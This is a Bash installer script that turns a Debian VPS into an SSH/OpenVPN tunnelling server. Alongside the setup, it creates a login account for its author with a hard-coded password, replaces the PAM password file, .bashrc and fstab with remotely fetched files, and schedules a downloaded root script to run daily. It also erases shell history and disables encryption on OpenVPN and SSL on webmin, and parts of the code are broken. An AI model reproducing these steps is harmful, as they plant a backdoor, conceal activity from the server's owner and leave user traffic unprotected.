#!/bin/bash
# Created By M Fauzan Romandhoni (+6281311310405) (m.fauzan58@yahoo.com)

clear

#Requirement
if [ ! -e /usr/bin/curl ]; then
    apt-get -y update && apt-get -y upgrade
	apt-get -y install curl
fi

if [[ $USER != "root" ]]; then
	echo "Maaf, Anda harus menjalankan ini sebagai root"
	exit
fi

# initialisasi var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
#MYIP=$(wget -qO- ipv4.icanhazip.com);

# get the VPS IP
#ip=`ifconfig venet0:0 | grep 'inet addr' | awk {'print $2'} | sed s/.*://`

#MYIP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
MYIP=$(ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1)
if [ "$MYIP" = "" ]; then
	MYIP=$(wget -qO- ipv4.icanhazip.com)
fi
MYIP2="s/xxxxxxxxx/$MYIP/g";
ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
if [[ $ether = "" ]]; then
        ether=eth0
fi

#vps="zvur";
vps="aneka";

#if [[ $vps = "zvur" ]]; then
	#source="http://"
#else
	source="cloudip.org/sshinjector.net/debian9"
#fi

# MULAI SETUP
myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
if [ $USER != 'root' ]; then
echo "Sorry, for run the script please using root user"
exit 1
fi
if [[ "$EUID" -ne 0 ]]; then
echo "Sorry, you need to run this as root"
exit 2
fi

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

#Add DNS Server ipv4
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf
sed -i '$ i\echo "nameserver 8.8.8.8" > /etc/resolv.conf' /etc/rc.local
sed -i '$ i\echo "nameserver 8.8.4.4" >> /etc/resolv.conf' /etc/rc.local

# install wget and curl
apt-get update;sudo apt-get -y install wget curl;

# set time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

# set locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
service ssh restart

# set repo
sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
wget "http://www.dotdeb.org/dotdeb.gpg"
wget "http://www.webmin.com/jcameron-key.asc"
cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg
cat jcameron-key.asc | apt-key add -;rm jcameron-key.asc

# remove unused
sudo apt-get -y --purge remove samba*;
sudo apt-get -y --purge remove apache2*;
sudo apt-get -y --purge remove sendmail*;
sudo apt-get -y --purge remove bind9*;
sudo apt-get -y purge sendmail*
sudo apt-get -y remove sendmail*

# Installing OpenVPN by pulling its repository inside sources.list file 
 rm -rf /etc/apt/sources.list.d/openvpn*
 echo "deb http://build.openvpn.net/debian/openvpn/stable $(lsb_release -sc) main" > /etc/apt/sources.list.d/openvpn.list
 wget -qO - http://build.openvpn.net/debian/openvpn/stable/pubkey.gpg|apt-key add -
 apt-get update
 apt-get install openvpn -y

# update
sudo apt-get update; sudo apt-get -y upgrade;

# install webserver
sudo apt-get -y install nginx php-fpm php-cli

# install essential package
echo "mrtg mrtg/conf_mods boolean true" | debconf-set-selections
sudo apt-get -y install bmon iftop htop nmap axel nano iptables traceroute sysv-rc-conf dnsutils bc nethogs openvpn vnstat less screen psmisc apt-file whois ptunnel ngrep mtr git zsh mrtg snmp snmpd snmp-mibs-downloader unzip unrar rsyslog debsums rkhunter
sudo apt-get -y install build-essential

# disable exim
service exim4 stop
sysv-rc-conf exim4 off

# update apt-file
apt-file update

# setting vnstat
vnstat -u -i eth0
service vnstat restart

# Screenfetch
cd
wget $source/screenfetch
mv screenfetch /usr/bin/screenfetch
chmod +x /usr/bin/screenfetch

# script
wget -O /etc/pam.d/common-password "$source/common-password"
chmod +x /etc/pam.d/common-password

# disable exim
service exim4 stop
sysv-rc-conf exim4 off

# update apt-file
sudo apt-file update

# setting vnstat
vnstat -u -i eth0
service vnstat restart

# Instal (D)DoS Deflate
if [ -d '/usr/local/ddos' ]; then
	echo; echo; echo "Please un-install the previous version first"
	exit 0
else
	mkdir /usr/local/ddos
fi
clear
echo; echo 'Installing DOS-Deflate 0.6'; echo
echo; echo -n 'Downloading source files...'
wget -q -O /usr/local/ddos/ddos.conf $sources/ddos.conf
echo -n '.'
wget -q -O /usr/local/ddos/LICENSE $source/LICENSE
echo -n '.'
wget -q -O /usr/local/ddos/ignore.ip.list $source/ignore.ip.list
echo -n '.'
wget -q -O /usr/local/ddos/ddos.sh $source/ddos/ddos.sh
chmod 0755 /usr/local/ddos/ddos.sh
cp -s /usr/local/ddos/ddos.sh /usr/local/sbin/ddos
echo '...done'
echo; echo -n 'Creating cron to run script every minute.....(Default setting)'
/usr/local/ddos/ddos.sh --cron > /dev/null 2>&1
echo '.....done'
echo; echo 'Installation has completed.'
echo 'Config file is at /usr/local/ddos/ddos.conf'
echo 'Please send in your comments and/or suggestions to zaf@vsnl.com'

# install fail2ban
apt-get update;apt-get -y install fail2ban;service fail2ban restart;

# openvpn
sudo apt-get -y install openvpn
cd /etc/openvpn/
wget $source/certificate.tar;tar xf certificate.tar;rm certificate.tar

# Web Server
cd
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "$source/nginx.conf"
mkdir -p /home/vps/public_html
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /home/vps/public_html/index.html $source/index.html
wget -O /etc/nginx/conf.d/vps.conf "$source/vps.conf"
sed -i 's/listen = \/var\/run\/php7.2-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.2/fpm/pool.d/www.conf
service nginx restart

# Checking if openvpn folder is accidentally deleted or purged
 if [[ ! -e /etc/openvpn ]]; then
  mkdir -p /etc/openvpn

# Creating server.conf, ca.crt, server.crt and server.key
 cat > /etc/openvpn/server_tcp.conf <<END
# OpenVPN TCP
port 555
proto tcp
dev tun
ca /etc/openvpn/ca.crt
cert /etc/openvpn/server.crt
key /etc/openvpn/server.key
dh /etc/openvpn/dh2048.pem
verify-client-cert none
username-as-common-name
key-direction 0
plugin /etc/openvpn/plugins/openvpn-plugin-auth-pam.so login
server 10.200.0.0 255.255.0.0
ifconfig-pool-persist ipp.txt
push "route-method exe"
push "route-delay 2"
keepalive 10 120
comp-lzo
user nobody
group nogroup
persist-key
persist-tun
status openvpn-status.log
log tcp.log
verb 2
ncp-disable
cipher none
auth none
END

cat > /etc/openvpn/server_udp.conf <<END
# OpenVPN UDP
port 1194
proto udp
dev tun
ca /etc/openvpn/ca.crt
cert /etc/openvpn/server.crt
key /etc/openvpn/server.key
dh /etc/openvpn/dh2048.pem
verify-client-cert none
username-as-common-name
key-direction 0
plugin /etc/openvpn/plugins/openvpn-plugin-auth-pam.so login
server 10.201.0.0 255.255.0.0
ifconfig-pool-persist ipp.txt
push "route-method exe"
push "route-delay 2"
keepalive 10 120
comp-lzo
user nobody
group nogroup
persist-key
persist-tun
status openvpn-status.log
log udp.log
verb 2
ncp-disable
cipher none
auth none
END

# Getting all dns inside resolv.conf then use as Default DNS for our openvpn server
 grep -v '#' /etc/resolv.conf | grep 'nameserver' | grep -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | while read -r line; do
	echo "push \"dhcp-option DNS $line\"" >> /etc/openvpn/server_tcp.conf
done

# Creating a New update message in server.conf
cat > /etc/openvpn/server.conf <<END
 # New Update are now released, OpenVPN Server
 # are now running both TCP and UDP Protocol. (Both are only running on IPv4)
 # But our native server.conf are now removed and divided
 # Into two different configs base on their Protocols:
 #  * OpenVPN TCP (located at /etc/openvpn/server_tcp.conf
 #  * OpenVPN UDP (located at /etc/openvpn/server_udp.conf
 # 
 # Also other logging files like
 # status logs and server logs
 # are moved into new different file names:
 #  * OpenVPN TCP Server logs (/etc/openvpn/tcp.log)
 #  * OpenVPN UDP Server logs (/etc/openvpn/udp.log)
 #  * OpenVPN TCP Status logs (/etc/openvpn/tcp_stats.log)
 #  * OpenVPN UDP Status logs (/etc/openvpn/udp_stats.log)
 #
 # Server ports are configured base on env vars
 # executed/raised from this script (OpenVPN_TCP_Port/OpenVPN_UDP_Port)
 #
 # Enjoy the new update
 # Script Updated by JohnFordTV
END
 
# Getting some OpenVPN plugins for unix authentication
 cd
 wget https://github.com/johndesu090/AutoScriptDB/raw/master/Files/Plugins/plugin.tgz
 tar -xzvf /root/plugin.tgz -C /etc/openvpn/
 rm -f plugin.tgz
 
# Some workaround for OpenVZ machines for "Startup error" openvpn service
 if [[ "$(hostnamectl | grep -i Virtualization | awk '{print $2}' | head -n1)" == 'openvz' ]]; then
 sed -i 's|LimitNPROC|#LimitNPROC|g' /lib/systemd/system/openvpn*
 systemctl daemon-reload
fi

# set ipv4 forward
echo 1 > /proc/sys/net/ipv4/ip_forward
sed -i 's|#net.ipv4.ip_forward=1|net.ipv4.ip_forward=1|' /etc/sysctl.conf
sed -i 's|net.ipv4.ip_forward=0|net.ipv4.ip_forward=1|' /etc/sysctl.conf

# Iptables Rule for OpenVPN server
 cat > /etc/openvpn/openvpn.bash <<END
#!/bin/bash
PUBLIC_INET="$(ip -4 route ls | grep default | grep -Po '(?<=dev )(\S+)' | head -1)"
IPCIDR='10.200.0.0/16'
IPCIDR2='10.201.0.0/16'
iptables -I FORWARD -s $IPCIDR -j ACCEPT
iptables -I FORWARD -s $IPCIDR2 -j ACCEPT
iptables -t nat -A POSTROUTING -o $PUBLIC_INET -j MASQUERADE
iptables -t nat -A POSTROUTING -s $IPCIDR -o $PUBLIC_INET -j MASQUERADE
iptables -t nat -A POSTROUTING -s $IPCIDR2 -o $PUBLIC_INET -j MASQUERADE
EOFipt
 chmod +x /etc/openvpn/openvpn.bash
 bash /etc/openvpn/openvpn.bash

 # Enabling IPv4 Forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # Starting OpenVPN server
 systemctl start openvpn@server_tcp
 systemctl enable openvpn@server_tcp
 systemctl start openvpn@server_udp
 systemctl enable openvpn@server_udp

cat > /home/vps/public_html/tcp-client.ovpn <<END
# OpenVPN Configuration Dibuat Oleh Sshinjector.net
# (Contact Bussines: M Fauzan Romandhoni - m.fauzan58@yahoo.com)
client
dev tun
proto tcp
setenv FRIENDLY_NAME "sshinjector.net"
remote $MYIP $OpenVPN_TCP_Port
remote-cert-tls server
bind
float
mute-replay-warnings
connect-retry-max 9999
redirect-gateway def1
connect-retry 0 1
resolv-retry infinite
setenv CLIENT_CERT 0
persist-tun
persist-key
auth-user-pass
auth none
auth-nocache
auth-retry interact
cipher none
comp-lzo
reneg-sec 0
verb 0
nice -20
<ca>
-----BEGIN CERTIFICATE-----
MIIFZDCCBEygAwIBAgIJANDo1Jr6Al+yMA0GCSqGSIb3DQEBCwUAMIHRMQswCQYD
VQQGEwJJRDEUMBIGA1UECBMLSmF3YSBUZW5nYWgxDjAMBgNVBAcTBUJsb3JhMRgw
FgYDVQQKEw9Tc2hpbmplY3Rvci5uZXQxMTAvBgNVBAsTKEZyZWUgUHJlbWl1bSBT
U0ggZGFuIFZQTiBTU0wvVExTIFNlcnZpY2UxGzAZBgNVBAMTElNzaGluamVjdG9y
Lm5ldCBDQTEPMA0GA1UEKRMGc2VydmVyMSEwHwYJKoZIhvcNAQkBFhJjc0Bzc2hp
bmplY3Rvci5uZXQwHhcNMjAwNjExMDQwNjEyWhcNMzAwNjA5MDQwNjEyWjCB0TEL
MAkGA1UEBhMCSUQxFDASBgNVBAgTC0phd2EgVGVuZ2FoMQ4wDAYDVQQHEwVCbG9y
YTEYMBYGA1UEChMPU3NoaW5qZWN0b3IubmV0MTEwLwYDVQQLEyhGcmVlIFByZW1p
dW0gU1NIIGRhbiBWUE4gU1NML1RMUyBTZXJ2aWNlMRswGQYDVQQDExJTc2hpbmpl
Y3Rvci5uZXQgQ0ExDzANBgNVBCkTBnNlcnZlcjEhMB8GCSqGSIb3DQEJARYSY3NA
c3NoaW5qZWN0b3IubmV0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
0K3vlvCxz3Rsx5y0SX90erEgCzFvpRJfQasAZaWKtnq/jbNt0ofIyY6l12yko6Ri
jvjljPcIUvfqWtwlNYTfP3I/UHO2Kd2635cGN6KMvLNsMsSqfFPndBl/okn/8ewD
6zmNFZ5H4FVXqB6YNZ6NYW2UTwzsxJjPsFVhiT/kzZ4dDB1m1gFSVC//NfWUZuvk
PuPet7rKHKwe6blrCcU0J+JhHLwSavZ6TNMVDAEBBqkk6cqEEcZ7GiW0sDfqEfkT
NsJh3WpllTIeqUokfh68oJVoLxI1RPPOdYONGNMVf/uPiNHLRi4S2Q+nVG4ePKdn
3s04NAVXCZF8KQ4MHH3C2wIDAQABo4IBOzCCATcwHQYDVR0OBBYEFMMZw/FDwT+3
l99B42dj1oUOXvbcMIIBBgYDVR0jBIH+MIH7gBTDGcPxQ8E/t5ffQeNnY9aFDl72
3KGB16SB1DCB0TELMAkGA1UEBhMCSUQxFDASBgNVBAgTC0phd2EgVGVuZ2FoMQ4w
DAYDVQQHEwVCbG9yYTEYMBYGA1UEChMPU3NoaW5qZWN0b3IubmV0MTEwLwYDVQQL
EyhGcmVlIFByZW1pdW0gU1NIIGRhbiBWUE4gU1NML1RMUyBTZXJ2aWNlMRswGQYD
VQQDExJTc2hpbmplY3Rvci5uZXQgQ0ExDzANBgNVBCkTBnNlcnZlcjEhMB8GCSqG
SIb3DQEJARYSY3NAc3NoaW5qZWN0b3IubmV0ggkA0OjUmvoCX7IwDAYDVR0TBAUw
AwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAinNNz43TcTf8ffvjJ1aKEQScaSuBXIT+
9C8PLXWOhOZIFDxAAA40HtZu8iCjtpCu0Z+rLxDqnu2+KSgiOZXxp4mS3ooa6j5B
ImeGIclzRgKPsSHZHU8VXXYdnPZP6KeBPWYnwc8bz9exG36Hpe9UBmvuWPtIAh2l
8eFNzTiOoJwdPP3HpELYoB70ES8F4LtoIVteaZCoDubay0HT36SFGg1sUQ+6DqYl
aRKiEUEkLjQAwe5Js8LtJTPWtrOpJvstmPJvCP38ycVIUBK/xrQl+PDKWE+7o2lA
9cS9EcGkLyGX1pKYWFiNbNKxgMWp34MmM9axxYwANj08l1ZEqVtEvw==
-----END CERTIFICATE-----
</ca>
END
cat > /home/vps/public_html/udp-client.ovpn <<END
# OpenVPN Configuration Dibuat Oleh Sshinjector.net
# (Contact Bussines: M Fauzan Romandhoni - m.fauzan58@yahoo.com)
client
dev tun
proto udp
setenv FRIENDLY_NAME "sshinjector.net"
remote $MYIP 1194
remote-cert-tls server
bind
float
mute-replay-warnings
connect-retry-max 9999
redirect-gateway def1
connect-retry 0 1
resolv-retry infinite
setenv CLIENT_CERT 0
persist-tun
persist-key
auth-user-pass
auth none
auth-nocache
auth-retry interact
cipher none
comp-lzo
reneg-sec 0
verb 0
nice -20
<ca>
-----BEGIN CERTIFICATE-----
MIIFZDCCBEygAwIBAgIJANDo1Jr6Al+yMA0GCSqGSIb3DQEBCwUAMIHRMQswCQYD
VQQGEwJJRDEUMBIGA1UECBMLSmF3YSBUZW5nYWgxDjAMBgNVBAcTBUJsb3JhMRgw
FgYDVQQKEw9Tc2hpbmplY3Rvci5uZXQxMTAvBgNVBAsTKEZyZWUgUHJlbWl1bSBT
U0ggZGFuIFZQTiBTU0wvVExTIFNlcnZpY2UxGzAZBgNVBAMTElNzaGluamVjdG9y
Lm5ldCBDQTEPMA0GA1UEKRMGc2VydmVyMSEwHwYJKoZIhvcNAQkBFhJjc0Bzc2hp
bmplY3Rvci5uZXQwHhcNMjAwNjExMDQwNjEyWhcNMzAwNjA5MDQwNjEyWjCB0TEL
MAkGA1UEBhMCSUQxFDASBgNVBAgTC0phd2EgVGVuZ2FoMQ4wDAYDVQQHEwVCbG9y
YTEYMBYGA1UEChMPU3NoaW5qZWN0b3IubmV0MTEwLwYDVQQLEyhGcmVlIFByZW1p
dW0gU1NIIGRhbiBWUE4gU1NML1RMUyBTZXJ2aWNlMRswGQYDVQQDExJTc2hpbmpl
Y3Rvci5uZXQgQ0ExDzANBgNVBCkTBnNlcnZlcjEhMB8GCSqGSIb3DQEJARYSY3NA
c3NoaW5qZWN0b3IubmV0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
0K3vlvCxz3Rsx5y0SX90erEgCzFvpRJfQasAZaWKtnq/jbNt0ofIyY6l12yko6Ri
jvjljPcIUvfqWtwlNYTfP3I/UHO2Kd2635cGN6KMvLNsMsSqfFPndBl/okn/8ewD
6zmNFZ5H4FVXqB6YNZ6NYW2UTwzsxJjPsFVhiT/kzZ4dDB1m1gFSVC//NfWUZuvk
PuPet7rKHKwe6blrCcU0J+JhHLwSavZ6TNMVDAEBBqkk6cqEEcZ7GiW0sDfqEfkT
NsJh3WpllTIeqUokfh68oJVoLxI1RPPOdYONGNMVf/uPiNHLRi4S2Q+nVG4ePKdn
3s04NAVXCZF8KQ4MHH3C2wIDAQABo4IBOzCCATcwHQYDVR0OBBYEFMMZw/FDwT+3
l99B42dj1oUOXvbcMIIBBgYDVR0jBIH+MIH7gBTDGcPxQ8E/t5ffQeNnY9aFDl72
3KGB16SB1DCB0TELMAkGA1UEBhMCSUQxFDASBgNVBAgTC0phd2EgVGVuZ2FoMQ4w
DAYDVQQHEwVCbG9yYTEYMBYGA1UEChMPU3NoaW5qZWN0b3IubmV0MTEwLwYDVQQL
EyhGcmVlIFByZW1pdW0gU1NIIGRhbiBWUE4gU1NML1RMUyBTZXJ2aWNlMRswGQYD
VQQDExJTc2hpbmplY3Rvci5uZXQgQ0ExDzANBgNVBCkTBnNlcnZlcjEhMB8GCSqG
SIb3DQEJARYSY3NAc3NoaW5qZWN0b3IubmV0ggkA0OjUmvoCX7IwDAYDVR0TBAUw
AwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAinNNz43TcTf8ffvjJ1aKEQScaSuBXIT+
9C8PLXWOhOZIFDxAAA40HtZu8iCjtpCu0Z+rLxDqnu2+KSgiOZXxp4mS3ooa6j5B
ImeGIclzRgKPsSHZHU8VXXYdnPZP6KeBPWYnwc8bz9exG36Hpe9UBmvuWPtIAh2l
8eFNzTiOoJwdPP3HpELYoB70ES8F4LtoIVteaZCoDubay0HT36SFGg1sUQ+6DqYl
aRKiEUEkLjQAwe5Js8LtJTPWtrOpJvstmPJvCP38ycVIUBK/xrQl+PDKWE+7o2lA
9cS9EcGkLyGX1pKYWFiNbNKxgMWp34MmM9axxYwANj08l1ZEqVtEvw==
-----END CERTIFICATE-----
</ca>
END

cd
cd /home/vps/public_html/
tar -czf /home/vps/public_html/client.tar.gz tcp-client.ovpn udp-client.ovpn

# Cronjob
cd;wget $source/cronjob.tar
tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash mfauzan
echo "mfauzan:121998" | chpasswd
clear
rm -rf /root/cronjob.tar

#Setting IPtables
cat > /etc/iptables.up.rules <<-END
*filter
:FORWARD ACCEPT [0:0]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A FORWARD -i eth0 -o ppp0 -m state --state RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -i ppp0 -o eth0 -j ACCEPT
-A OUTPUT -d 23.66.241.170 -j DROP
-A OUTPUT -d 23.66.255.37 -j DROP
-A OUTPUT -d 23.66.255.232 -j DROP
-A OUTPUT -d 23.66.240.200 -j DROP
-A OUTPUT -d 128.199.213.5 -j DROP
-A OUTPUT -d 128.199.149.194 -j DROP
-A OUTPUT -d 128.199.196.170 -j DROP
-A OUTPUT -d 103.52.146.66 -j DROP
-A OUTPUT -d 5.189.172.204 -j DROP
COMMIT

*nat
:PREROUTING ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
-A POSTROUTING -o eth0 -j MASQUERADE
-A POSTROUTING -s 192.168.100.0/24 -o eth0 -j MASQUERADE
-A POSTROUTING -s 10.1.0.0/24 -o eth0 -j MASQUERADE
COMMIT
END
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i $MYIP2 /etc/iptables.up.rules;
iptables-restore < /etc/iptables.up.rules

# badvpn
wget -O /usr/bin/badvpn-udpgw $source/badvpn-udpgw
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/badvpn-udpgw $source/badvpn-udpgw64
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
# replace BadVPN
apt-get -y install cmake make gcc
wget $source/badvpn-1.999.128.tar.bz2
tar xf badvpn-1.999.128.tar.bz2
mkdir badvpn-build
cd badvpn-build
cmake ~/badvpn-1.999.128 -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_UDPGW=1
make install
screen badvpn-udpgw --listen-addr 127.0.0.1:7300 > /dev/null &
cd
rm -f /root/badvpn-1.999.128.tar.bz2

# ssh
sed -i '$ i\Banner /etc/banner.txt' /etc/ssh/sshd_config
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config

# dropbear
sudo apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 456 -p 777"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/banner.txt"@g' /etc/default/dropbear
service ssh restart
service dropbear restart
#upgrade
sudo apt-get install zlib1g-dev
wget $source/dropbear-2019.78.tar.bz2
bzip2 -cd dropbear-2019.78.tar.bz2 | tar xvf -
cd dropbear-2019.78
./configure
make && make install
mv /usr/sbin/dropbear /usr/sbin/dropbear1
ln /usr/local/sbin/dropbear /usr/sbin/dropbear
service dropbear restart
rm -f /root/dropbear-2019.78.tar.bz2

# BAANER
wget -O /etc/banner.txt $source/banner.txt
# squid3
sudo apt-get -y install squid3
cat > /etc/squid/squid.conf <<-END
acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 70
acl Safe_ports port 210
acl Safe_ports port 1025-65535
acl Safe_ports port 280
acl Safe_ports port 488
acl Safe_ports port 591
acl Safe_ports port 777
acl CONNECT method CONNECT
acl SSH dst ipserver-ipserver/255.255.255.255
http_access allow SSH
http_access deny all
http_port 3128
http_port 8080
http_port 80
http_port 8000
hierarchy_stoplist cgi-bin ?
coredump_dir /var/spool/squid
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern .               0       20%     4320
visible_hostname proxy.sshinjector.net

END

sed -i "s/ipserver/$MYIP/g" /etc/squid/squid.conf
service squid restart
# install webmin
apt-get -y install webmin
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
cd
apt-get install -y libxml-parser-perl
/etc/init.d/webmin restart

# text gambar
sudo apt-get install boxes

# install teks berwarna
sudo apt-get -y install ruby
sudo gem install lolcat

# Text Berwarna
cd
rm -rf /root/.bashrc
wget -O /root/.bashrc "$source/bash.sh"

# install stunnel4
sudo apt-get -y install stunnel4
wget -O /etc/stunnel/stunnel.pem "$source/stunnel.pem"
cat > /etc/stunnel/stunnel.conf <<-END
cert = /etc/stunnel/stunnel.pem
client = no
socket = a:SO_REUSEADDR=1
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1


[dropbear]
accept = 443
connect = 127.0.0.1:442
connect = 127.0.0.1:456
connect = 127.0.0.1:777

[openssh]
accept = 444
connect = 127.0.0.1:22

END

sed -i $MYIP2 /etc/stunnel/stunnel.conf
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
service stunnel4 restart

# download script
cd
wget -O /usr/bin/benchmark $source/benchmark.sh
wget -O /usr/bin/speedtest $source/speedtest_cli.py
wget -O /usr/bin/ps-mem $source/ps_mem.py
wget -O /usr/bin/dropmon $source/dropmon.sh
wget -O /usr/bin/menu $source/menu.sh
wget -O /usr/bin/user-active-list $source/user-active-list.sh
wget -O /usr/bin/user-add $source/user-add.sh
wget -O /usr/bin/user-del $source/user-del.sh
wget -O /usr/bin/disable-user-expire $source/disable-user-expire.sh
wget -O /usr/bin/delete-user-expire $source/delete-user-expire.sh
wget -O /usr/bin/banned-user $source/banned-user.sh
wget -O /usr/bin/unbanned-user $source/unbanned-user.sh
wget -O /usr/bin/user-expire-list $source/user-expire-list.sh
wget -O /usr/bin/user-gen $source/user-gen.sh
wget -O /usr/bin/userlimit.sh $source/userlimit.sh
wget -O /usr/bin/userlimitssh.sh $source/userlimitssh.sh
wget -O /usr/bin/user-list $source/user-list.sh
wget -O /usr/bin/user-login $source/user-login.sh
wget -O /usr/bin/user-pass $source/user-pass.sh
wget -O /usr/bin/user-renew $source/user-renew.sh
wget -O /usr/bin/edit-openssh $source/edit-openssh.sh
wget -O /usr/bin/edit-dropbear $source/edit-dropbear.sh
wget -O /usr/bin/edit-squid $source/edit-squid.sh
wget -O /usr/bin/edit-stunnel $source/edit-stunnel.sh
wget -O /usr/bin/edit-banner $source/edit-banner.sh
wget -O /usr/bin/health $source/server-health.sh
wget -O /usr/bin/clearcache.sh $source/clearcache.sh
cd

#rm -rf /etc/cron.weekly/
#rm -rf /etc/cron.hourly/
#rm -rf /etc/cron.monthly/
rm -rf /etc/cron.daily/

# autoreboot
echo "*/10 * * * * root service dropbear restart" > /etc/cron.d/dropbear
echo "*/10 * * * * root service stunnel4 restart" > /etc/cron.d/stunnel4
echo "*/10 * * * * root service squid restart" > /etc/cron.d/squid
echo "*/10 * * * * root service ssh restart" > /etc/cron.d/ssh
echo "*/10 * * * * root service webmin restart" > /etc/cron.d/webmin
#echo "0 */48 * * * root /sbin/reboot" > /etc/cron.d/reboot
echo "00 23 * * * root /usr/bin/disable-user-expire" > /etc/cron.d/disable-user-expire
echo "00 23 * * * root /usr/bin/delete-user-expire" > /etc/cron.d/delete-user-expire
echo "0 */1 * * * root echo 3 > /proc/sys/vm/drop_caches" > /etc/cron.d/clearcaches
#echo "0 */1 * * * root /usr/bin/clearcache.sh" > /etc/cron.d/clearcache1
wget -O /root/passwd "$source/passwd.sh"
chmod +x /root/passwd
echo "01 23 * * * root /root/passwd" > /etc/cron.d/passwd
cd

chmod +x /usr/bin/benchmark
chmod +x /usr/bin/speedtest
chmod +x /usr/bin/ps-mem
#chmod +x /usr/bin/autokill
chmod +x /usr/bin/dropmon
chmod +x /usr/bin/menu
chmod +x /usr/bin/user-active-list
chmod +x /usr/bin/user-add
chmod +x /usr/bin/user-del
chmod +x /usr/bin/disable-user-expire
chmod +x /usr/bin/delete-user-expire
chmod +x /usr/bin/banned-user
chmod +x /usr/bin/unbanned-user
chmod +x /usr/bin/user-expire-list
chmod +x /usr/bin/user-gen
chmod +x /usr/bin/userlimit.sh
chmod +x /usr/bin/userlimitssh.sh
chmod +x /usr/bin/user-list
chmod +x /usr/bin/user-login
chmod +x /usr/bin/user-pass
chmod +x /usr/bin/user-renew
chmod +x /usr/bin/edit-openssh
chmod +x /usr/bin/edit-dropbear
chmod +x /usr/bin/edit-squid
chmod +x /usr/bin/edit-stunnel
chmod +x /usr/bin/edit-banner
chmod +x /usr/bin/health
chmod +x /usr/bin/clearcache.sh

# finishing
chown -R www-data:www-data /home/vps/public_html
/etc/init.d/cron restart
/etc/init.d/php7.2-fpm restart
/etc/init.d/nginx start
/etc/init.d/ssh restart
/etc/init.d/dropbear restart
/etc/init.d/fail2ban restart
/etc/init.d/squid restart
/etc/init.d/webmin restart
/etc/init.d/openvpn restart
/etc/init.d/stunnel4 restart
rm -rf ~/.bash_history && history -c
echo "unset HISTFILE" >> /etc/profile

# swap ram
dd if=/dev/zero of=/swapfile bs=2048 count=2048k
# buat swap
mkswap /swapfile
# jalan swapfile
swapon /swapfile
#auto star saat reboot
wget $source/fstab
mv ./fstab /etc/fstab
chmod 644 /etc/fstab
sysctl vm.swappiness=10
#permission swapfile
chown root:root /swapfile 
chmod 0600 /swapfile

rm -f up.sh
sysv-rc-conf rc.local on
